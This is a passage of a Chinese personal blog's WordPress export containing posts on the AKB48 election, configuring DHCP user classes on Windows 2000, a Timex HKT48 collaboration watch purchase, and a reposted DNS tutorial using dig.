		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[273]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>2016，一指团结。</title>
		<link>https://www.nervgeek.com/2016/06/01/2016%ef%bc%8c%e4%b8%80%e6%8c%87%e5%9b%a2%e7%bb%93%e3%80%82/</link>
		<pubDate>Wed, 01 Jun 2016 15:00:41 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1285</guid>
		<description></description>
		<content:encoded><![CDATA[六月一日晚上AKB48剧场公演之后宣布 <strong>AKB48 45th单曲第八届总选举</strong> 的速报排名，指原莉乃掉出了连续三年速报第一，由渡边麻友取得。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/QG@2LNZLEVH9RMSFE.png"><img class="size-full wp-image-1286 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/QG@2LNZLEVH9RMSFE.png" alt="~(QG)@2LNZLEVH9&#96;RMSF~)E" width="471" height="309" /></a>
今年速报破4w，比起上年足足多了一万多票，可见今年总选举的激烈程度，虽然不管输赢何人，最终赢家还是AKS。但个人认为，今年的第一，还得要指原莉乃拿！
<!--more-->
比起2013年夺冠最后那句话 "<strong>虽然AKB48也很好，但大家会为HKT48加油吗？</strong>"，2015年夺冠后最后那句话就成了 "<strong>大家还会继续为AKB48G加油吗？</strong>"。可见宅姐已经开始扛起AKBG的大旗，从HKT48带队、人才培养到输血至AKB48，宅姐已经奶AKBG奶得尽心尽责，村内村外都为AKB刷了不少的流量。
渡边麻友（非黑，路人粉）是AKB48前期打江山成员，对AKB48的贡献非常巨大，但目前他带团队能力，村外刷话题能力，并非是最佳人选。
只是希望宅姐今年安安稳稳拿第一完成连霸这个无人涉及的领域，后年可以考虑安心毕业。投两票！献上微薄的一份力！
我不会忘记上年的那句名言——"<strong>在那天，像赐予我力量的偶像那样，我能给大家带去力量是最让我欣慰的。</strong>"
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/72M_IVT9@6VCWMS27BF.jpg"><img class="size-full wp-image-1287 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/72M_IVT9@6VCWMS27BF.jpg" alt="72M[_IVT{9@6VCW$MS%27BF" width="540" height="960" /></a>
一指团结！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1285</wp:post_id>
		<wp:post_date><![CDATA[2016-06-01 23:00:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-01 15:00:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[2016%ef%bc%8c%e4%b8%80%e6%8c%87%e5%9b%a2%e7%bb%93%e3%80%82]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[akb48hkt48]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="other"><![CDATA[Other]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1288]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[292]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Windows 2000 DHCP 配置用户类</title>
		<link>https://www.nervgeek.com/2016/06/03/windows-2000-dhcp-%e9%85%8d%e7%bd%ae%e7%94%a8%e6%88%b7%e7%b1%bb/</link>
		<pubDate>Fri, 03 Jun 2016 11:17:48 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1295</guid>
		<description></description>
		<content:encoded><![CDATA[最近要考那个傻逼高新证，看了下书，做了两道习题，那个用户类设置卡住了，经过多次折腾，终于设置成功。
第一步：<strong>服务器右键</strong> -&gt; <strong>定义用户类</strong>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/1KUW2I6BHINMA5JIVEC.png"><img class="size-full wp-image-1297 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/1KUW2I6BHINMA5JIVEC.png" alt="1K]UW[2I6&#96;BHINMA5J%IVEC" width="646" height="631" /></a>
<!--more-->
第二步：点击添加。（cid5_4穿越了，可以无视）
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/NNH30TW@3XPK2DQ31IB7.png"><img class="size-full wp-image-1298 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/NNH30TW@3XPK2DQ31IB7.png" alt="NNH~30TW@3XP[K&#96;2DQ31IB7" width="646" height="631" /></a>
&nbsp;
第三步：在 <strong>显示名称</strong> 上填写用户类名，在下面的输入框 <strong>ASCII</strong> 处输入的要和<strong>显示名称一致</strong>。点击确定保存。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/3928Z58BHR@@QQDA@Z34.png"><img class="size-full wp-image-1307 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/3928Z58BHR@@QQDA@Z34.png" alt="](3928Z58BHR}@@QQDA@Z34" width="646" height="631" /></a>
&nbsp;
第四步：右键 <strong>服务器选项</strong> ，选择<strong>配置选项</strong>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/ETM333FOLAREI2E4GMG7.png"><img class="size-full wp-image-1300 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/ETM333FOLAREI2E4GMG7.png" alt="{ETM333FOLARE~~I2E4GMG7" width="646" height="631" /></a>
&nbsp;
第五步：在 <strong>用户类别</strong> 选择刚才新建的类别，第一个配置 <strong>路由器</strong> ，在IP地址内输入<strong>DHCP服务器的IP地址</strong>，按添加。然后确定保存。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/Y9UR_QV8GUTOZ_OOIEO.png"><img class="size-full wp-image-1302 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/Y9UR_QV8GUTOZ_OOIEO.png" alt="Y9UR_QV8G&#96;~U%TOZ}_OOIEO" width="646" height="631" /></a>
&nbsp;
第六步：重复第四步（<strong>右键 <strong>服务器选项</strong> ，选择<strong>配置选项</strong>。</strong>），然后配置 <strong>DNS 服务器</strong> ，输<strong>入DHCP服务器的IP</strong>。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/Y9UR_QV8GUTOZ_OOIEO.png"><img class="size-full wp-image-1302 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/Y9UR_QV8GUTOZ_OOIEO.png" alt="Y9UR_QV8G&#96;~U%TOZ}_OOIEO" width="646" height="631" /></a>
&nbsp;
第七步：重复第四步（<strong>右键 <strong>服务器选项</strong> ，选择<strong>配置选项</strong>。</strong>），配置 <strong>租约</strong> ，<strong>长类型</strong>里输入的是秒数，864000=10天。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/5B05SRKYWQ6C4PFFCCS.png"><img class="size-full wp-image-1303 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/5B05SRKYWQ6C4PFFCCS.png" alt="5B05&#96;SRKYWQ6C4PFF%%CC$S" width="646" height="631" /></a>
&nbsp;
配置完成：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/AR6G2CXMRMCSDECLWV7ABH.png"><img class="size-full wp-image-1304 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/AR6G2CXMRMCSDECLWV7ABH.png" alt="AR6G2CXMRMC%SDECLWV7ABH" width="646" height="631" /></a>
&nbsp;
客户端设置：打开CMD，输入 <code>ipconfig /setclassid * cid5_4</code> 。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/3PUKP9HZ74C4DNJLVB05.png"><img class="size-full wp-image-1308 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/3PUKP9HZ74C4DNJLVB05.png" alt="3PUKP9%HZ74C[4DNJLVB)05" width="646" height="631" /></a>
输入 <code>ipconfig /all</code> 查看：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/CFSDZ7@5XEEU8TQ4A.png"><img class="size-full wp-image-1309 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/CFSDZ7@5XEEU8TQ4A.png" alt="]CFSD(}Z7@&#96;5XEEU(8{TQ4A" width="646" height="631" /></a>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1295</wp:post_id>
		<wp:post_date><![CDATA[2016-06-03 19:17:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-03 11:17:48]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[windows-2000-dhcp-%e9%85%8d%e7%bd%ae%e7%94%a8%e6%88%b7%e7%b1%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="classid"><![CDATA[classid]]></category>
		<category domain="post_tag" nicename="dhcp"><![CDATA[DHCP]]></category>
		<category domain="post_tag" nicename="windows-2000"><![CDATA[Windows 2000]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%94%a8%e6%88%b7%e7%b1%bb"><![CDATA[用户类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[219]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>新手表！TIMEX Weekender &amp; HKT48 指原莉乃 ver.</title>
		<link>https://www.nervgeek.com/2016/06/11/%e6%96%b0%e6%89%8b%e8%a1%a8%ef%bc%81timex-weekender-hkt48-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-ver/</link>
		<pubDate>Sat, 11 Jun 2016 14:45:05 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1294</guid>
		<description></description>
		<content:encoded><![CDATA[前几天正当我想买个手表的时候，看到14年的时候TIMEX和HKT48有合作，推出了一个合作版的TIMEX Weekender，那简直就是坑粉丝钱的利器啊，价格不贵又有偶像加成，这手肯定是要剁了。
不过钱包见扁，日本亚马逊要9990日元，算上刚好涨价了的日本EMS...还有有可能会被收的关税，没有900左右的大洋是拿不下了，900块添点钱都可以考虑其他更好的手表了...何必呢？<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/7M_OCDWEDNDKNLIBT.png"><img class="size-full wp-image-1337 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/7M_OCDWEDNDKNLIBT.png" alt="7{M_O)CDWEDNDKN)${L}IBT" width="1664" height="964" /></a>
<!--more-->
正当我纠结的时候，一位大大提到了日拍这个网站，我在里面找到同款的手表！而且还送海报！而且5000日元就能立马拍下！这不用纠结了，起码节省了300块，600大洋不到入一个合作版，我感觉还是值得的。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/dff2a5fb4368141d2f48e431747acedb.jpg"><img class="size-full wp-image-1338 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/dff2a5fb4368141d2f48e431747acedb.jpg" alt="dff2a5fb4368141d2f48e431747acedb" width="912" height="694" /></a>
由于不懂日拍海购，拜托了淘宝的日拍代购，总费用为：5000日元+597日元（日本国内运费）+89人民币（日本EMS直邮中国）+111.59人民币的关税，最终约合人民币545元左右，而且最近海关比较严，被收了关税，人品好可以430拿下！
5月30号拍下，6月2号到代拍的家里，6月6号已经到了广州，立马把关税交了，被扣了一天，6月8日就到手了。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8124.jpg"><img class="size-full wp-image-1339 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8124.jpg" alt="_MG_8124" width="1555" height="1037" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8125.jpg"><img class="size-full wp-image-1340 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8125.jpg" alt="_MG_8125" width="1555" height="1037" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8126.jpg"><img class="size-full wp-image-1341 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8126.jpg" alt="_MG_8126" width="1555" height="1037" /></a>

<p style="text-align: center;">三张未拆封的照片。</p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8127.jpg"><img class="size-full wp-image-1342 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8127.jpg" alt="_MG_8127" width="1555" height="1037" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8129.jpg"><img class="size-full wp-image-1343 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8129.jpg" alt="_MG_8129" width="1555" height="1037" /></a>

<p style="text-align: center;">这个手表价格还算上多送的一条原装尼龙手表带，强！无敌！</p>

<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8130.jpg"><img class="size-full wp-image-1344 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8130.jpg" alt="_MG_8130" width="1555" height="1037" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8133.jpg"><img class="size-full wp-image-1345 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/06/MG_8133.jpg" alt="_MG_8133" width="1555" height="1037" /></a>

<p style="text-align: center;">包装内部还送了几张贴纸，随时充值信仰。</p>

<p style="text-align: left;">带了几天的感觉，尼龙就是比较舒服，而且大热天不会感到闷热。手表表盘38mm，和普通手表40mm接近，但表盘周边较为简洁，所以带着手上有点显小。滴答声很大，晚上睡觉非常明显听到响声。</p>

<p style="text-align: left;">一个字：值！</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1294</wp:post_id>
		<wp:post_date><![CDATA[2016-06-11 22:45:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-11 14:45:05]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%96%b0%e6%89%8b%e8%a1%a8%ef%bc%81timex-weekender-hkt48-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-ver]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="other"><![CDATA[Other]]></category>
		<category domain="post_tag" nicename="timex"><![CDATA[TIMEX]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1344]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[275]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>DNS原理入门</title>
		<link>https://www.nervgeek.com/2016/06/18/dns%e5%8e%9f%e7%90%86%e5%85%a5%e9%97%a8/</link>
		<pubDate>Sat, 18 Jun 2016 02:41:54 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1347</guid>
		<description></description>
		<content:encoded><![CDATA[昨天是Linux笔试，老师出了好几道我不是很懂的题，果然是基础不扎实啊。其中简答题需要我们把DNS的查询流程写出来，简直难到我了，所以现在学习学习一下。
&nbsp;

<hr />

&nbsp;

<h1 id="page-title" class="asset-name entry-title">DNS 原理入门</h1>

<div id="share_button"></div>

<div class="asset-meta">
<p class="vcard author">作者： 阮一峰</p>
日期： <abbr class="published" title="2016-06-16T07:12:39+08:00">2016年6月16日</abbr>
</div>

<div id="main-content" class="asset-content entry-content">
DNS 是互联网核心协议之一。不管是上网浏览，还是编程开发，都需要了解一点它的知识。
本文详细介绍DNS的原理，以及如何运用工具软件观察它的运作。我的目标是，读完此文后，你就能完全理解DNS。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/a96738e66bb5bc4a2d27ee9f07bbdca3.png" alt="" />
<h2><span style="font-size: 24pt;">一、DNS 是什么？</span></h2>
DNS （Domain Name System 的缩写）的作用非常简单，就是根据域名查出IP地址。你可以把它想象成一本巨大的电话本。
举例来说，如果你要访问域名<code>math.stackexchange.com</code>，首先要通过DNS查出它的IP地址是<code>151.101.129.69</code>。
如果你不清楚为什么一定要查出IP地址，才能进行网络通信，建议先阅读我写的<a href="http://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html" target="_blank">《互联网协议入门》</a>。
<!--more-->
&nbsp;
<h2><span style="font-size: 24pt;">二、查询过程</span></h2>
虽然只需要返回一个IP地址，但是DNS的查询过程非常复杂，分成多个步骤。
工具软件<code>dig</code>可以显示整个查询过程。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig math<span class="token punctuation">.</span>stackexchange<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
上面的命令会输出六段信息。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/592de35fba4a71e0bfbb7cb31c8e0094.png" alt="" />
第一段是查询参数和统计。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/5bf2550259cb4c0d6ab8bcfc9f47599d.png" alt="" />
第二段是查询内容。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/b600db3c6dbb3f71a88addf824951d2a.png" alt="" />
上面结果表示，查询域名<code>math.stackexchange.com</code>的<code>A</code>记录，<code>A</code>是address的缩写。
第三段是DNS服务器的答复。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/d1fa6565b8a43cf3e99b9c872f8a087d.png" alt="" />
上面结果显示，<code>math.stackexchange.com</code>有四个<code>A</code>记录，即四个IP地址。<code>600</code>是TTL值（Time to live 的缩写），表示缓存时间，即600秒之内不用重新查询。
第四段显示<code>stackexchange.com</code>的NS记录（Name Server的缩写），即哪些服务器负责管理<code>stackexchange.com</code>的DNS记录。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/6d361612a1947d4e6c83a982080c1ddf.png" alt="" />
上面结果显示<code>stackexchange.com</code>共有四条NS记录，即四个域名服务器，向其中任一台查询就能知道<code>math.stackexchange.com</code>的IP地址是什么。
第五段是上面四个域名服务器的IP地址，这是随着前一段一起返回的。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/02b6994dd88358fd957e6a7298c7208b.png" alt="" />
第六段是DNS服务器的一些传输信息。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/0fa31134e3aa693bcf3936c7cd173117.png" alt="" />
上面结果显示，本机的DNS服务器是<code>192.168.1.253</code>，查询端口是53（DNS服务器的默认端口），以及回应长度是305字节。
如果不想看到这么多内容，可以使用<code>+short</code>参数。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig <span class="token operator">+</span>short math<span class="token punctuation">.</span>stackexchange<span class="token punctuation">.</span>com
<span class="token number">151.101</span><span class="token punctuation">.</span><span class="token number">129.69</span>
<span class="token number">151.101</span><span class="token punctuation">.</span><span class="token number">65.69</span>
<span class="token number">151.101</span><span class="token punctuation">.</span><span class="token number">193.69</span>
<span class="token number">151.101</span><span class="token punctuation">.</span><span class="token number">1.69</span>
</code></pre>
</blockquote>
上面命令只返回<code>math.stackexchange.com</code>对应的4个IP地址（即<code>A</code>记录）。
&nbsp;
<h2><span style="font-size: 24pt;">三、DNS服务器</span></h2>
下面我们根据前面这个例子，一步步还原，本机到底怎么得到域名<code>math.stackexchange.com</code>的IP地址。
首先，本机一定要知道DNS服务器的IP地址，否则上不了网。通过DNS服务器，才能知道某个域名的IP地址到底是什么。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/400de0d27e694c9e288945df30e0032e.jpg" alt="" />
DNS服务器的IP地址，有可能是动态的，每次上网时由网关分配，这叫做DHCP机制；也有可能是事先指定的固定地址。Linux系统里面，DNS服务器的IP地址保存在<code>/etc/resolv.conf</code>文件。
上例的DNS服务器是<code>192.168.1.253</code>，这是一个内网地址。有一些公网的DNS服务器，也可以使用，其中最有名的就是Google的<a href="https://developers.google.com/speed/public-dns/" target="_blank"><code>8.8.8.8</code></a>和Level 3的<a href="https://www.tummy.com/articles/famous-dns-server/" target="_blank"><code>4.2.2.2</code></a>。
本机只向自己的DNS服务器查询，<code>dig</code>命令有一个<code>@</code>参数，显示向其他DNS服务器查询的结果。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig @<span class="token number">4.2</span><span class="token punctuation">.</span><span class="token number">2.2</span> math<span class="token punctuation">.</span>stackexchange<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
上面命令指定向DNS服务器<code>4.2.2.2</code>查询。
&nbsp;
<h2><span style="font-size: 24pt;">四、域名的层级</span></h2>
DNS服务器怎么会知道每个域名的IP地址呢？答案是分级查询。
请仔细看前面的例子，每个域名的尾部都多了一个点。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/b600db3c6dbb3f71a88addf824951d2a.png" alt="" />
比如，域名<code>math.stackexchange.com</code>显示为<code>math.stackexchange.com.</code>。这不是疏忽，而是所有域名的尾部，实际上都有一个根域名。
举例来说，<code>www.example.com</code>真正的域名是<code>www.example.com.root</code>，简写为<code>www.example.com.</code>。因为，根域名<code>.root</code>对于所有域名都是一样的，所以平时是省略的。
根域名的下一级，叫做"顶级域名"（top-level domain，缩写为TLD），比如<code>.com</code>、<code>.net</code>；再下一级叫做"次级域名"（second-level domain，缩写为SLD），比如<code>www.example.com</code>里面的<code>.example</code>，这一级域名是用户可以注册的；再下一级是主机名（host），比如<code>www.example.com</code>里面的<code>www</code>，又称为"三级域名"，这是用户在自己的域里面为服务器分配的名称，是用户可以任意分配的。
总结一下，域名的层级结构如下。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
主机名<span class="token punctuation">.</span>次级域名<span class="token punctuation">.</span>顶级域名<span class="token punctuation">.</span>根域名
<span class="token comment" spellcheck="true"># 即
</span>
host<span class="token punctuation">.</span>sld<span class="token punctuation">.</span>tld<span class="token punctuation">.</span>root
</code></pre>
</blockquote>
<h2></h2>
<h2><span style="font-size: 24pt;">五、根域名服务器</span></h2>
DNS服务器根据域名的层级，进行分级查询。
需要明确的是，每一级域名都有自己的NS记录，NS记录指向该级域名的域名服务器。这些服务器知道下一级域名的各种记录。
所谓"分级查询"，就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下。
<blockquote>
<ol start="1">
    <li>从"根域名服务器"查到"顶级域名服务器"的NS记录和A记录（IP地址）</li>
    <li>从"顶级域名服务器"查到"次级域名服务器"的NS记录和A记录（IP地址）</li>
    <li>从"次级域名服务器"查出"主机名"的IP地址</li>
</ol>
</blockquote>
仔细看上面的过程，你可能发现了，没有提到DNS服务器怎么知道"根域名服务器"的IP地址。回答是"根域名服务器"的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。
下面是内置的根域名服务器IP地址的一个<a href="http://www.cyberciti.biz/faq/unix-linux-update-root-hints-data-file/" target="_blank">例子</a>。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/490f3c0c9586208f3076c24fc97326c4.png" alt="" />
上面列表中，列出了根域名（<code>.root</code>）的三条NS记录<code>A.ROOT-SERVERS.NET</code>、<code>B.ROOT-SERVERS.NET</code>和<code>C.ROOT-SERVERS.NET</code>，以及它们的IP地址（即<code>A</code>记录）<code>198.41.0.4</code>、<code>192.228.79.201</code>、<code>192.33.4.12</code>。
另外，可以看到所有记录的TTL值是3600000秒，相当于1000小时。也就是说，每1000小时才查询一次根域名服务器的列表。
目前，世界上一共有十三组根域名服务器，从<code>A.ROOT-SERVERS.NET</code>一直到<code>M.ROOT-SERVERS.NET</code>。
&nbsp;
<h2><span style="font-size: 24pt;">六、分级查询的实例</span></h2>
<code>dig</code>命令的<code>+trace</code>参数可以显示DNS的整个分级查询过程。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig <span class="token operator">+</span>trace math<span class="token punctuation">.</span>stackexchange<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
上面命令的第一段列出根域名<code>.</code>的所有NS记录，即所有根域名服务器。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/7b46e14737dda5e9e943fec10bdefd58.png" alt="" />
根据内置的根域名服务器IP地址，DNS服务器向所有这些IP地址发出查询请求，询问<code>math.stackexchange.com</code>的顶级域名服务器<code>com.</code>的NS记录。最先回复的根域名服务器将被缓存，以后只向这台服务器发请求。
接着是第二段。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/b8141dcdb9e181062b7ff206bb3f15ab.png" alt="" />
